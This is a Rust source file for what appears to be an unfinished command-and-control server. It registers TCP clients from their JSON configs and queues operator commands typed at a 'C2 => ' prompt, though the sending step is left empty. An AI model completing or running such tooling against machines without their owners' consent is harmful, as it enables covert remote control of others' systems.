use std::io::{self, BufRead, BufReader, Write};
use std::net::TcpStream;

use crate::config::{ClientConfig, ClientDetails, ClientManager};
use crate::handler::command::commands;

fn send_command() {

}

pub fn handle_client(stream: TcpStream, client_manager: ClientManager){
    let ip = stream.peer_addr().unwrap().to_string();
    let mut buffer = Vec::new();
    let mut reader = BufReader::new(&stream);

    // Initial configuration reception
    if let Ok(_) = reader.read_until(b'\n', &mut buffer) {
        match serde_json::from_slice::<ClientConfig>(&buffer) {
            Ok(config) => {
                println!("[I] Received config from {}: {:?}", ip, config);
                client_manager.add_client(ip.clone(), ClientDetails {
                    config,
                    command: None,
                });
            },
            Err(e) => println!("[E] Failed to deserialize Client Config from \
                               {}: {}", ip, e),
        }
    }

    // Waits for commands
    loop {
        let cmd: Option<String> = client_manager.get_command(&ip);
        if cmd != None {
            let cmd2 = cmd.unwrap();
            println!("[I] Sending '{}' command to {}", cmd2, ip);


            println!("[I] Wainting for the output of the command command '{}' \
                     sent to {}", cmd2, ip);

            client_manager.reset_command(&ip).unwrap();
        }
    }
}

pub fn server(server_client_manager: ClientManager) {
    let mut cmd = String::new();

    loop {
        println!("C2 => ");
        io::stdout().flush().unwrap();

        cmd.clear();
        io::stdin().read_line(&mut cmd).expect("Failed to read command");
        cmd = cmd.trim_end().to_owned();

        commands(&cmd, &server_client_manager);
    }
}

